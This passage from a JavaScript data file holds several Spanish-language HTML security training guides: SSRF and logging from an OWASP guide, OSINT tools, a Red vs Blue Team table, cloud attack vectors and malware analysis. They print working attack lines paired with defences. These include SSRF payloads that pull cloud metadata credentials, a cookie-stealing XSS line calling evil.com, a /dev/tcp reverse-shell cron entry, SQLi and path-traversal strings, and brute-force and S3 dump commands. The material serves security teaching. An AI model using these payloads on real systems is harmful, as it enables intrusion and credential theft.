<p>No puedes responder a lo que no ves. La falta de logs y monitoreo permite ataques no detectados durante meses (dwell time promedio: 200+ días).</p>

<h4>9.1 Qué deberías estar logueando</h4>
<ul>
<li>Todos los intentos de login (éxito y fallo)</li>
<li>Cambios de roles y permisos</li>
<li>Acceso a datos sensibles</li>
<li>Cambios en configuración de seguridad</li>
<li>Errores de aplicación (con cuidado de no exponer datos sensibles)</li>
<li>Operaciones de administrador</li>
<li>Peticiones a endpoints críticos (/api/admin/*)</li>
<li>Modificaciones o borrados de recursos</li>
</ul>

<h4>9.2 Buenas prácticas de logging</h4>
<pre><code class="language-python"># Buen logging de seguridad
import logging
security_logger = logging.getLogger('security')
security_logger.setLevel(logging.INFO)

# Log de login fallido
security_logger.warning(f"LOGIN_FAILED user={username} ip={request.remote_addr} time={datetime.now()}")

# Log de cambio de rol
security_logger.info(f"ROLE_CHANGE admin={current_user} target={target_user} new_role={role} ip={request.remote_addr}")

# Log de acceso denegado
security_logger.warning(f"ACCESS_DENIED user={current_user} resource={request.path} ip={request.remote_addr}")</code></pre>

<h4>9.3 Herramientas de SIEM</h4>
<ul>
<li><strong>Splunk:</strong> El estándar empresarial (caro)</li>
<li><strong>ELK Stack:</strong> Elasticsearch + Logstash + Kibana (open source)</li>
<li><strong>Wazuh:</strong> Open source SIEM + XDR (basado en OSSEC)</li>
<li><strong>Graylog:</strong> Alternativa open source a Splunk</li>
<li><strong>Sentinel (Azure):</strong> SIEM cloud de Microsoft</li>
<li><strong>Chronicle (Google):</strong> SIEM cloud de Google</li>
</ul>

<h3>A10: Server-Side Request Forgery (SSRF)</h3>
<p>Ocurre cuando un servidor realiza peticiones HTTP a recursos controlados por el atacante. Muy crítico en entornos cloud donde permite acceder a metadata de instancias.</p>

<h4>10.1 SSRF a metadata cloud</h4>
<pre><code class="language-bash"># AWS Metadata (IMDSv1 — sin autenticación)
curl "http://169.254.169.254/latest/meta-data/"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://169.254.169.254/latest/user-data/"
curl "http://169.254.169.254/latest/meta-data/public-keys/"

# AWS Metadata (IMDSv2 — requiere token)
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 3600" http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Azure Metadata
curl "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata: true"

# GCP Metadata
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"</code></pre>

<h4>10.2 SSRF a servicios internos</h4>
<pre><code class="language-bash"># Servicios comunes en localhost
curl "http://localhost:22/"
curl "http://127.0.0.1:443/"
curl "http://0.0.0.0:80/"
curl "http://[::1]:8080/"
curl "http://localhost:6379/"      # Redis
curl "http://localhost:9200/"      # Elasticsearch
curl "http://localhost:27017/"     # MongoDB
curl "http://localhost:5000/"      # Flask dev server
curl "http://localhost:3000/"      # React dev server
curl "http://localhost:5432/"      # PostgreSQL
curl "http://localhost:3306/"      # MySQL

# Protocolos alternativos
file:///etc/passwd
dict://localhost:6379/info
gopher://localhost:6379/_*2%0d%0a...  # Redis via gopher
ftp://ftp.example.com/</code></pre>

<h4>10.3 Bypass de restricciones SSRF</h4>
<pre><code class="language-bash"># DNS resolution tricks
# Usar un dominio que resuelve a 127.0.0.1
curl "http://localhost/"

# IPv6
curl "http://[::1]:22/"

# URL parsing bypass
curl "http://expected.com@169.254.169.254/"
curl "http://169.254.169.254#@expected.com/"
curl "http://expected.com:80@169.254.169.254/"
curl "http://169.254.169.254%2f@expected.com/"
curl "http://expected.com:80%00@169.254.169.254/"

# Redirección (si el servidor sigue redirects)
# El atacante pone un server que redirige a metadata
curl "http://attacker.com/redirect"

# DNS re-binding
# Registrar un dominio que alterna entre IPs
# Primera petición: resuelve a IP permitida
# Segunda petición: resuelve a 169.254.169.254

# Usar decimal/octal/hexadecimal
curl "http://2130706433/"        # 127.0.0.1 en decimal
curl "http://0x7f000001/"        # 127.0.0.1 en hex
curl "http://017700000001/"      # 127.0.0.1 en octal</code></pre>

<h4>10.4 Defensa contra SSRF</h4>
<ul>
<li><strong>Whitelist de URLs permitidas</strong> (no blacklist — siempre se evade)</li>
<li><strong>Deshabilitar protocolos peligrosos:</strong> file://, dict://, gopher://, ftp://</li>
<li><strong>Validar que la URL resuelve a una IP pública</strong> (no 127.0.0.1, 10.x, 172.x, 192.168.x)</li>
<li><strong>No reenviar respuestas internas al cliente</strong></li>
<li><strong>Usar IMDSv2 en AWS</strong> (requiere token, no solo curl)</li>
<li><strong>Segmentación de red:</strong> Metadata endpoints en red separada</li>
<li><strong>Firewall de salida:</strong> Restringir tráfico saliente desde servidores web</li>
</ul>

<div class="guide-callout tip">💡 <strong>Práctica recomendada:</strong> PortSwigger Web Security Academy tiene laboratorios gratuitos para cada categoría del OWASP Top 10. Completa TODOS los laboratorios de las 10 categorías. Luego practica en TryHackMe (path "Web Fundamentals") y HackTheBox (máquinas web). El OWASP Top 10 es la base de TODO en seguridad web — domínalo.</div>

<div class="guide-callout goal"><strong>🎯 Objetivo cumplido:</strong> Ahora conoces en profundidad las 10 categorías del OWASP Top 10. Eres capaz de identificar, explotar y defender cada tipo de vulnerabilidad. Este conocimiento es el mínimo indispensable para cualquier profesional de seguridad ofensiva o defensiva.</div>
</div>`
    },
    {
      id: "osint-guide",
      title: "OSINT Completo — 40+ Herramientas",
      subtitle: "Reconocimiento pasivo profesional",
      emoji: "🔍", category: "herramientas", level: "Principiante",
      elements: 90, estimatedReadTime: 9,
      tags: ["osint", "recon", "herramientas", "investigacion"],
      linkedArticles: [],
      description: "Passive recon, 40+ herramientas con uso exacto, casos de uso por categoría, GDPR y límites legales.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Dominar la recolección de información de fuentes abiertas (OSINT) para pentesting, investigaciones y threat intelligence. 40+ herramientas organizadas por categoría.</div>

<h3>🌐 Búsqueda Avanzada en Internet</h3>

<h4>Google Dorking</h4>
<p>Operadores de búsqueda avanzada para encontrar información que no debería estar expuesta.</p>
<pre><code class="language-text"># Archivos específicos
site:example.com filetype:pdf
site:example.com filetype:xls password
# Directorios expuestos
intitle:"index of" site:example.com
# Paneles de administración
inurl:admin intitle:login
# Cámaras IP
inurl:"view/view.shtml"
# Bases de datos expuestas
filetype:sql "INSERT INTO" "password"
# Configuraciones
filetype:env "DB_PASSWORD"
# Error messages
"Warning: mysql_connect()" site:example.com</code></pre>

<h4>Motores alternativos</h4>
<ul>
<li><strong>Shodan:</strong> Buscador de dispositivos conectados — <code>port:22 country:ES city:Madrid</code></li>
<li><strong>Censys:</strong> Similar a Shodan, con más datos de SSL/TLS</li>
<li><strong>Hunter.io:</strong> Encuentra emails corporativos por dominio</li>
<li><strong>Dehashed:</strong> Busca credenciales filtradas (de pago)</li>
<li><strong>Intelligence X:</strong> Archivo histórico de datos (pastebins, leaks)</li>
</ul>

<pre><code class="language-bash"># Shodan CLI
shodan search 'port:3389 country:ES'
shodan host 8.8.8.8
# Hunter.io API (gratuito limitado)
curl "https://api.hunter.io/v2/domain-search?domain=example.com&api_key=KEY"</code></pre>

<h3>👤 Personas y Redes Sociales</h3>

<table>
<tr><th>Herramienta</th><th>Uso</th></tr>
<tr><td>Sherlock</td><td>Buscar nombre de usuario en 300+ redes sociales</td></tr>
<tr><td>Maigret</td><td>Similar a Sherlock pero más preciso</td></tr>
<tr><td>WhatsMyName</td><td>Web unificado de búsqueda de usuarios</td></tr>
<tr><td>Social-analyzer</td><td>Análisis profundo de perfiles sociales</td></tr>
<tr><td>Twint</td><td>Scraping de Twitter sin API (no requiere auth)</td></tr>
<tr><td>LinkedIn Scraper</td><td>Extraer datos de perfiles (con cuidado)</td></tr>
</table>

<pre><code class="language-bash"># Sherlock: buscar username en redes
sherlock username
# Maigret
maigret username --all
# Twint (sin API)
twint -u @username -s --csv  # tweets de un usuario
twint -s "keyword" --since 2025-01-01  # búsqueda por palabra</code></pre>

<h3>🏢 Empresas y Dominios</h3>

<table>
<tr><th>Herramienta</th><th>Función</th><th>Ejemplo</th></tr>
<tr><td>theHarvester</td><td>Emails, subdominios, IPs</td><td><code>theHarvester -d example.com -b all</code></td></tr>
<tr><td>Sublist3r</td><td>Enumeración de subdominios</td><td><code>sublist3r -d example.com</code></td></tr>
<tr><td>Amass</td><td>Reconocimiento de dominios (OWASP)</td><td><code>amass enum -d example.com</code></td></tr>
<tr><td>Findomain</td><td>Subdominios vía Certificate Transparency</td><td><code>findomain -t example.com</code></td></tr>
<tr><td>DNSDumpster</td><td>Visualización gráfica de DNS</td><td>Web: dnsdumpster.com</td></tr>
<tr><td>Certificate Transparency</td><td>crt.sh — certificados SSL emitidos</td><td>crt.sh/?q=%25.example.com</td></tr>
</table>

<pre><code class="language-bash"># Amass completo
amass enum -d example.com -o results.txt
# Buscar en crt.sh
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
# theHarvester completo
theHarvester -d example.com -l 500 -b google,linkedin,yahoo,dns</code></pre>

<h3>📂 Fugas de Datos y Leaks</h3>
<ul>
<li><strong>Have I Been Pwned:</strong> Ver si un email ha sido filtrado</li>
<li><strong>Dehashed:</strong> Búsqueda en bases de datos filtradas (pago)</li>
<li><strong>Snusbase:</strong> Agregador de breaches de datos</li>
<li><strong>LeakCheck:</strong> Otra alternativa de búsqueda de leaks</li>
<li><strong>Pastebin / Ghostbin:</strong> Búsqueda manual de filtraciones recientes</li>
<li><strong>Telegram:</strong> Canales de leaked databases</li>
</ul>

<pre><code class="language-bash"># Have I Been Pwned API
curl "https://haveibeenpwned.com/api/v3/breachedaccount/email@example.com"
# PSBDump (si tienes acceso a la base de datos local)
# Buscar en Pastebin con Google Dork
site:pastebin.com "example.com"</code></pre>

<h3>📍 Geolocalización y Física</h3>
<ul>
<li><strong>Google Maps / Earth:</strong> Búsqueda por coordenadas, áreas</li>
<li><strong>GeoIP:</strong> Localizar IP geográficamente</li>
<li><strong>OpenStreetMap:</strong> Datos cartográficos abiertos</li>
<li><strong>Instagram Location:</strong> Fotos geolocalizadas</li>
<li><strong>EXIF Data:</strong> Metadatos de fotos (GPS, cámara, fecha)</li>
<li><strong>Street View:</strong> Inspección visual de ubicaciones</li>
</ul>

<pre><code class="language-bash"># GeoIP
curl ipinfo.io/8.8.8.8
# Extraer EXIF
exiftool foto.jpg | grep -i gps
# Geolocalizar IP
geoiplookup 8.8.8.8</code></pre>

<h3>📸 Imágenes y Metadatos</h3>
<ul>
<li><strong>Google Images:</strong> Búsqueda inversa de imágenes</li>
<li><strong>TinEye:</strong> Buscar origen de una imagen</li>
<li><strong>ExifTool:</strong> Extraer TODOS los metadatos de un archivo</li>
<li><strong>Jeffrey's Image Metadata Viewer:</strong> Web para ver metadatos</li>
<li><strong>Forensically:</strong> Análisis forense de imágenes online</li>
<li><strong>FotoForensics:</strong> Detectar manipulación (ELA)</li>
</ul>

<h3>⚖️ Límites Legales y Ética</h3>
<div class="guide-callout warning">⚠️ <strong>Importante:</strong> La información pública NO significa información legal de usar. El Reglamento General de Protección de Datos (GDPR) en Europa y la LOPDGDD en España limitan el uso de datos personales incluso si son públicos. No almacenes datos personales sin justificación legal.</div>
<ul>
<li><strong>GDPR:</strong> Datos personales recolectados deben tener base legal</li>
<li><strong>LOPDGDD:</strong> Ley Orgánica de Protección de Datos española</li>
<li><strong>Art. 197 CP:</strong> Descubrimiento y revelación de secretos</li>
<li><strong>No cruzar:</strong> OSINT pasivo está bien; intentar acceder con creds obtenidas es DELITO</li>
<li><strong>Reportar:</strong> Si encuentras datos expuestos de terceros, notifica al responsable, no los explotes</li>
</ul>

<div class="guide-callout tip">💡 <strong>Flujo de trabajo OSINT recomendado:</strong> 1) Definir objetivo claro → 2) Recopilación pasiva (sin tocar el objetivo) → 3) Recopilación activa (con cuidado) → 4) Correlación de datos → 5) Documentación → 6) Reporte.</div>
</div>`
    },
    {
      id: "red-vs-blue",
      title: "Red Team vs Blue Team",
      subtitle: "Ataque vs Defensa detallado",
      emoji: "🛑", category: "tecnicas", level: "Intermedio",
      elements: 70, estimatedReadTime: 7,
      tags: ["redteam", "blueteam", "ataque", "defensa", "deteccion"],
      linkedArticles: [],
      description: "Cada técnica de ataque con su contramedida defensiva. 35 pares ataque/defensa con herramientas.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Entender la mentalidad de ataque (Red Team) y defensa (Blue Team) lado a lado. Cada técnica ofensiva incluye su contramedida específica.</div>

<h3>🔍 Fase de Reconocimiento</h3>

<table>
<tr><th>Red Team (Ataque)</th><th>Blue Team (Defensa)</th></tr>
<tr><td><strong>Shodan:</strong> Escanear dispositivos expuestos de la organización<br><code>shodan search org:"Target"</code></td><td><strong>Shodan Monitor:</strong> Vigilar tu propia huella digital. Saber qué IPs/dominios/ puertos tienes expuestos. Reducir superficie de ataque.</td></tr>
<tr><td><strong>theHarvester:</strong> Emails y subdominios públicos<br><code>theHarvester -d target.com -b all</code></td><td><strong>DMARC / SPF:</strong> Configurar correctamente autenticación de email. Monitorear subdominios olvidados. Servicio de ASM (Attack Surface Management).</td></tr>
<tr><td><strong>Nmap:</strong> Escaneo de puertos y servicios<br><code>nmap -sC -sV -O target.com</code></td><td><strong>Firewall + IPS:</strong> Limitar puertos expuestos al mínimo. SNORT/Suricata para detectar escaneos. Servicios banner grabding reducido.</td></tr>
<tr><td><strong>Google Dorking:</strong> Archivos y configs expuestas<br><code>site:target.com filetype:env</code></td><td><strong>robots.txt + monitoreo:</strong> Asegurar que no hay archivos sensibles indexados. Google Alerts + monitorización periódica de dorks.</td></tr>
</table>

<h3>🌐 Fase Web</h3>

<table>
<tr><th>Red Team (Ataque)</th><th>Blue Team (Defensa)</th></tr>
<tr><td><strong>SQLi:</strong> Extraer datos de BD<br><code>' UNION SELECT * FROM users --</code></td><td><strong>WAF + Prepared Statements:</strong> ModSecurity, parametrización de consultas. Input validation y output encoding.</td></tr>
<tr><td><strong>XSS:</strong> Robo de sesiones<br><code>&lt;script&gt;fetch('https://evil.com/'+document.cookie)&lt;/script&gt;</code></td><td><strong>CSP + HttpOnly + Input Sanitization:</strong> Content-Security-Policy restrictivo, cookies HttpOnly, sanitizar todo input de usuario</td></tr>
<tr><td><strong>LFI/RFI:</strong> Lectura de archivos internos<br><code>../../etc/passwd</code></td><td><strong>Input validation + chroot:</strong> Whitelist de rutas permitidas, deshabilitar allow_url_include, chroot de aplicación</td></tr>
<tr><td><strong>SSRF:</strong> Acceso a recursos internos<br><code>url=http://169.254.169.254/</code></td><td><strong>Network segmentation:</strong> Metadata de cloud en red separada, whitelist de URLs, deshabilitar protocolos (file://, gopher://)</td></tr>
</table>

<h3>🔑 Fase de Autenticación</h3>

<table>
<tr><th>Red Team (Ataque)</th><th>Blue Team (Defensa)</th></tr>
<tr><td><strong>Brute Force:</strong> Probar contraseñas<br><code>hydra -l admin -P rockyou.txt ssh://target</code></td><td><strong>Rate Limiting + Fail2Ban:</strong> Bloquear IP tras N intentos fallidos. CAPTCHA en login. Autenticación multifactor (MFA).</td></tr>
<tr><td><strong>Credential Stuffing:</strong> Usar creds filtradas de otros sitios</td><td><strong>HaveIBeenPwned + MFA:</strong> Detectar contraseñas comprometidas, hash matching con breach databases. Forzar cambio si se detecta.</td></tr>
<tr><td><strong>Pass-the-Hash:</strong> Usar hash NTLM sin conocer password</td><td><strong>Credential Guard + LAPS:</strong> Windows Defender Credential Guard, contraseñas locales únicas (LAPS), minimizar uso de NTLM.</td></tr>
</table>

<h3>🖥️ Post-Explotación</h3>

<table>
<tr><th>Red Team (Ataque)</th><th>Blue Team (Defensa)</th></tr>
<tr><td><strong>Escalado SUID:</strong> Binarios SUID vulnerables<br><code>find / -perm -4000 2>/dev/null</code></td><td><strong>Auditoría de SUID:</strong> Mantener registro de binarios SUID. Eliminar los innecesarios. Políticas de AppArmor/SELinux.</td></tr>
<tr><td><strong>Mimikatz:</strong> Dump de credenciales en Windows</td><td><strong>LSA Protection + Credential Guard:</strong> Deshabilitar WDigest, habilitar LSA Protection, usar Credential Guard. Detectar con Sysmon Event ID 10.</td></tr>
<tr><td><strong>Persistencia via cron:</strong> Tareas programadas<br><code>echo "bash -i >& /dev/tcp/ip/port 0>&1" | crontab</code></td><td><strong>Monitorización de cron:</strong> Sysmon + auditoría de crontab modificados. Alertas en nuevos cron jobs. Integridad de archivos (AIDE, Tripwire).</td></tr>
<tr><td><strong>Lateral Movement:</strong> Pass-the-Hash, PS Remoting</td><td><strong>Network segmentation + JIT:</strong> Segmentación de red, Least Privilege, Just-In-Time access, monitorizar conexiones laterales (Event ID 4624).</td></tr>
</table>

<h3>📡 Defensa Activa (Blue Team)</h3>
<ul>
<li><strong>SIEM:</strong> Splunk, ELK Stack, Wazuh — centralizar logs y crear alertas</li>
<li><strong>EDR:</strong> CrowdStrike, SentinelOne, Defender for Endpoint — detección en endpoint</li>
<li><strong>Honeypots:</strong> Engañar al atacante con señuelos (Cowrie, T-Pot)</li>
<li><strong>Threat Intelligence:</strong> MISP, OpenCTI — compartir y correlacionar IoCs</li>
<li><strong>Deception:</strong> Canary tokens, honey accounts, fake data</li>
</ul>

<div class="guide-callout tip">💡 <strong>Purple Team:</strong> La mejor estrategia es combinar Red + Blue. El Red Team ataca, el Blue aprende y mejora defensas. Repetir. Así es como maduran las organizaciones.</div>
</div>`
    },
    {
      id: "cloud-security-guide",
      title: "Seguridad Cloud AWS/Azure",
      subtitle: "Cloud Security Guide completa",
      emoji: "☁️", category: "tecnicas", level: "Avanzado",
      elements: 85, estimatedReadTime: 9,
      tags: ["cloud", "aws", "azure", "devops", "iac"],
      linkedArticles: [],
      description: "Arquitectura cloud segura, vectores de ataque por servicio, misconfiguraciones comunes y herramientas de defensa.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Aprender los fundamentos de seguridad en cloud (AWS + Azure), las misconfiguraciones más comunes, cómo explotarlas y cómo defender tu infraestructura.</div>

<h3>☁️ Conceptos Base de Cloud Security</h3>
<ul>
<li><strong>Modelo de Responsabilidad Compartida:</strong> AWS/Azure asegura la nube, TÚ aseguras lo que pones en ella</li>
<li><strong>IAM (Identity & Access Management):</strong> El 90% de los brechas cloud vienen de IAM mal configurado</li>
<li><strong>Principio de Mínimo Privilegio:</strong> Dar solo los permisos necesarios, ni uno más</li>
<li><strong>Infraestructura como Código (IaC):</strong> Terraform, CloudFormation — auditable, versionable</li>
</ul>

<h3>🇦 AWS — Vectores de Ataque Comunes</h3>

<h4>S3 Buckets Públicos</h4>
<p>El clásico. Buckets de S3 mal configurados que exponen datos sensibles.</p>
<pre><code class="language-bash"># Enumerar S3 buckets
aws s3 ls s3://target-bucket/ --no-sign-request
# Buscar buckets abiertos (herramienta: s3scanner)
s3scanner scan -bucket target-name
# Si encuentras uno: descargar TODO
aws s3 sync s3://target-bucket/ ./leaked/ --no-sign-request</code></pre>

<h4>IAM Misconfigurations</h4>
<ul>
<li><strong>Políticas demasiado permisivas:</strong> <code>"Action": "*"</code> en vez de acciones específicas</li>
<li><strong>Roles con trust policies abiertas:</strong> <code>"Principal": "*"</code> permite asumir rol a cualquiera</li>
<li><strong>Access Keys expuestas:</strong> En GitHub, configs, código cliente</li>
<li><strong>Falta de MFA en cuentas privilegiadas</strong></li>
</ul>

<pre><code class="language-bash"># Auditar políticas IAM
aws iam list-policies --scope Local
# Ver política inline de un usuario
aws iam list-user-policies --user-name admin
# Escanear keys expuestas (con truffleHog o gitLeaks)</code></pre>

<h4>Metadata SSRF</h4>
<p>Si una app web en EC2 sufre SSRF, se puede acceder al metadata endpoint y robar credenciales del rol IAM.</p>
<pre><code class="language-bash"># Metadata endpoint (solo accesible desde dentro de EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME
# Versión IMDSv2 (más segura, requiere token)
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 3600" http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/</code></pre>

<h3>🇧 Azure — Vectores de Ataque Comunes</h3>
<ul>
<li><strong>Managed Identity SSRF:</strong> Similar al metadata de AWS, endpoint <code>http://169.254.169.254/metadata/identity</code></li>
<li><strong>Key Vault misconfig:</strong> Acceso público a secretos, políticas de acceso débiles</li>
<li><strong>RBAC over-permissive:</strong> Roles Contributor/Owner en vez de roles específicos</li>
<li><strong>Storage Accounts públicos:</strong> Contenedores Blob sin autenticación</li>
<li><strong>Azure DevOps:</strong> Pipelines con credenciales hardcodeadas, variables secretas expuestas</li>
</ul>

<pre><code class="language-bash"># Enumerar Storage Accounts públicos
az storage container list --account-name target --auth-mode login
# Access Key de Storage Account
az storage account keys list -g ResourceGroup -n StorageName
# Enumerar Key Vault secrets
az keyvault secret list --vault-name target-vault</code></pre>

<h3>🛡️ Herramientas de Defensa Cloud</h3>

<table>
<tr><th>Herramienta</th><th>Función</th><th>Cloud</th></tr>
<tr><td>ScoutSuite</td><td>Auditoría de seguridad multi-cloud</td><td>AWS, Azure, GCP</td></tr>
<tr><td>Prowler</td><td>Benchmark CIS para AWS</td><td>AWS</td></tr>
<tr><td>CloudSploit</td><td>Escáner de misconfiguraciones</td><td>AWS, Azure, GCP</td></tr>
<tr><td>Checkov</td><td>Escaneo de IaC (Terraform, CF)</td><td>Multi-cloud</td></tr>
<tr><td>tfsec</td><td>Linter de seguridad para Terraform</td><td>Multi-cloud</td></tr>
<tr><td>Trivy</td><td>Vulnerabilidades en imágenes, IaC, repos</td><td>Multi</td></tr>
<tr><td>CloudTrail / Azure Monitor</td><td>Logging y auditoría nativa</td><td>AWS/Azure</td></tr>
</table>

<div class="guide-callout tip">💡 <strong>Buenas prácticas cloud:</strong> 1) IaC y GitOps para todo, 2) IAM con mínimo privilegio, 3) Cifrado en reposo y tránsito, 4) Logging centralizado + alertas, 5) Escaneo continuo con Prowler/ScoutSuite, 6) IMDSv2 en EC2.</div>
</div>`
    },
    {
      id: "malware-analysis-guide",
      title: "Malware: Tipos & Análisis",
      subtitle: "Análisis de malware práctico",
      emoji: "🦠", category: "tecnicas", level: "Avanzado",
      elements: 75, estimatedReadTime: 8,
      tags: ["malware", "reversing", "forense", "analisis"],
      linkedArticles: [],
      description: "Taxonomía de malware, análisis estático y dinámico, herramientas (Ghidra, IDA Pro, x64dbg) e indicadores de compromiso.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Aprender a clasificar malware y realizar análisis básico (estático y dinámico) con herramientas gratuitas. Identificar IoCs (Indicators of Compromise) y escribir informes.</div>

<h3>🧬 Taxonomía de Malware</h3>

<table>
<tr><th>Tipo</th><th>Qué hace</th><th>Ejemplo real</th></tr>
<tr><td><strong>Virus</strong></td><td>Se adjunta a archivos ejecutables, se replica al ejecutarlos</td><td>CIH (Chernobyl), Melissa</td></tr>
<tr><td><strong>Gusano (Worm)</strong></td><td>Se replica automáticamente por red sin necesidad de interacción</td><td>WannaCry (EternalBlue), Morris</td></tr>
<tr><td><strong>Troyano (Trojan)</strong></td><td>Se hace pasar por software legítimo para engañar al usuario</td><td>Emotet, Zeus</td></tr>
<tr><td><strong>Ransomware</strong></td><td>Cifra archivos y pide rescate</td><td>LockBit, BlackCat, REvil, WannaCry</td></tr>
<tr><td><strong>Rootkit</strong></td><td>Oculta su presencia manipulando el SO</td><td>Sony Rootkit, Stuxnet</td></tr>
<tr><td><strong>Spyware</strong></td><td>Espía actividad del usuario (teclas, pantalla, cámara)</td><td>Pegasus, FinFisher</td></tr>
<tr><td><strong>RAT (Remote Access Trojan)</strong></td><td>Da control remoto del sistema al atacante</td><td>DarkComet, njRAT, Quasar</td></tr>
<tr><td><strong>Loader/Dropper</strong></td><td>Descarga e instala otras cargas maliciosas</td><td>SmokeLoader, BumbleBee</td></tr>
<tr><td><strong>Botnet</strong></td><td>Red de equipos infectados controlados centralmente</td><td>Mirai (IoT), Emotet</td></tr>
</table>

<h3>🔬 Análisis Estático</h3>
<p>Analizar el malware sin ejecutarlo. Examina el binario, sus metadatos, cadenas y estructura.</p>

<h4>Herramientas de Análisis Estático</h4>
<ul>
<li><strong>file:</strong> Identificar tipo de archivo</li>
<li><strong>strings:</strong> Extraer cadenas de texto del binario</li>
<li><strong>pecheck / pefile:</strong> Analizar PE headers (Windows)</li>
<li><strong>DIE (Detect It Easy):</strong> Identificar compilador, empaquetador, formato</li>
<li><strong>ExifTool:</strong> Metadatos del archivo</li>
<li><strong>FLOSS:</strong> FireEye's strings deobfuscator — encuentra cadenas ofuscadas</li>
<li><strong>CAPA:</strong> Identificar capacidades del malware (FireEye)</li>
</ul>

<pre><code class="language-bash"># Análisis estático básico
file malware.exe
strings malware.exe | grep -i "http\|https\|\.com\|\.exe\|C:\\"
strings malware.exe | head -100
# FLOSS (encuentra cadenas ofuscadas)
floss malware.exe | grep -i "http\|key\|password\|C2"
# CAPA (identificar capacidades)
capa malware.exe</code></pre>

<h4>Desensamblado</h4>
<ul>
<li><strong>Ghidra (NSA):</strong> Reverse engineering framework GRATUITO. Decompilador a pseudo-C</li>
<li><strong>IDA Pro:</strong> El estándar de la industria (caro, versión gratuita limitada)</li>
<li><strong>x64dbg:</strong> Debugger para Windows (gratuito)</li>
<li><strong>Radare2 / rizin:</strong> Reverse engineering en CLI</li>
</ul>

<h3>⚡ Análisis Dinámico</h3>
<p>Ejecutar el malware en un entorno aislado para observar su comportamiento en tiempo real.</p>

<h4>Requisitos de seguridad</h4>
<div class="guide-callout warning">⚠️ <strong>NUNCA ejecutes malware en tu máquina principal.</strong> Usa siempre una máquina virtual aislada (VM snapshots que puedas revertir) o un sandbox online.</div>

<h4>Herramientas de Análisis Dinámico</h4>
<ul>
<li><strong>Process Monitor (ProcMon):</strong> Monitorear procesos, archivos, registro en Windows</li>
<li><strong>Process Hacker:</strong> Gestor de procesos avanzado</li>
<li><strong>Wireshark:</strong> Capturar tráfico de red generado</li>
<li><strong>Regshot:</strong> Comparar snapshots del registro antes/después</li>
<li><strong>API Monitor:</strong> Interceptar llamadas API de Windows</li>
<li><strong>FakeNet:</strong> Simular servicios de red para capturar tráfico</li>
<li><strong>INetSim:</strong> Simular servicios de red en Linux</li>
</ul>

<h4>Sandboxes Online</h4>
<ul>
<li><strong>VirusTotal:</strong> Subir muestra, análisis de 70+ AVs + comportamiento</li>
<li><strong>Any.Run:</strong> Sandbox interactivo, se ve el escritorio en tiempo real</li>
<li><strong>Joe Sandbox:</strong> Análisis profundo de comportamiento</li>
<li><strong>Cuckoo Sandbox:</strong> Open source, self-hosted</li>
<li><strong>Hybrid Analysis:</strong> Análisis gratuito limitado (CrowdStrike)</li>
</ul>

<h3>📊 Indicadores de Compromiso (IoCs)</h3>
<p>Lo que buscas en un análisis de malware:</p>
<ul>
<li><strong>Network IoCs:</strong> IPs de C2, dominios, URLs, user-agents</li>
<li><strong>File IoCs:</strong> Hashes (MD5, SHA1, SHA256), nombres de archivo, rutas</li>
<li><strong>Registry IoCs:</strong> Claves de registro creadas/modificadas</li>
<li><strong>Process IoCs:</strong> Nombres de proceso, mutexes, pipes</li>
<li><strong>Memory IoCs:</strong> Patrones en memoria, injected code</li>
</ul>

<pre><code class="language-bash"># Calcular hashes de una muestra
sha256sum malware.exe > sample.sha256
md5sum malware.exe
# Buscar IoCs en VirusTotal
# curl -s "https://www.virustotal.com/api/v3/files/{hash}"</code></pre>

<h3>📝 Flujo de Trabajo Recomendado</h3>
<ol>
<li><strong>Aislamiento:</strong> Copia la muestra a una VM aislada sin conexión a tu red</li>
<li><strong>Hashes:</strong> Calcula SHA256 de la muestra para referencia</li>
<li><strong>Estático básico:</strong> file, strings, DIE, FLOSS, CAPA</li>
<li><strong>Estático avanzado:</strong> Ghidra/IDA — entender lógica principal</li>
<li><strong>Dinámico:</strong> Ejecuta en sandbox, captura tráfico, monitoriza cambios</li>
<li><strong>Documentar:</strong> IoCs, comportamiento, capacidades, recomendaciones</li>
<li><strong>Compartir:</strong> MISP, OpenCTI, comunidades de threat intel</li>
</ol>

<div class="guide-callout tip">💡 <strong>Recursos:</strong> OALabs (YouTube), Malware Unicorn (cursos), Practical Malware Analysis (libro), Zero2Automated (curso avanzado), ANY.RUN para sandbox interactivo.</div>
</div>`
    },
    {
      id: "crypto-guide",
      title: "Criptografía para Hackers",
      subtitle: "Crypto aplicada a hacking",
      emoji: "🔐", category: "tecnicas", level: "Intermedio",
      elements: 65, estimatedReadTime: 6,
      tags: ["criptografia", "hashing", "cifrado", "pki", "tls"],
      linkedArticles: [],
      description: "Hashing (MD5→bcrypt), symmetric (AES), asymmetric (RSA), PKI, TLS y ataques criptográficos comunes.",
      content: `<div class="guide-content">

<div class="guide-callout goal"><strong>🎯 Objetivo:</strong> Entender los fundamentos criptográficos que todo profesional de ciberseguridad debe conocer: hashing, cifrado simétrico/asimétrico, PKI, TLS y los ataques más comunes.</div>

<h3>🔏 Hashing</h3>
<p>Función unidireccional: transforma datos en un hash de longitud fija. NO se puede revertir.</p>

<table>
<tr><th>Algoritmo</th><th>Longitud</th><th>Seguridad</th><th>Uso</th></tr>
<tr><td>MD5</td><td>128 bits</td><td>❌ ROTO (colisiones desde 2004)</td><td>Solo checksums no críticos</td></tr>
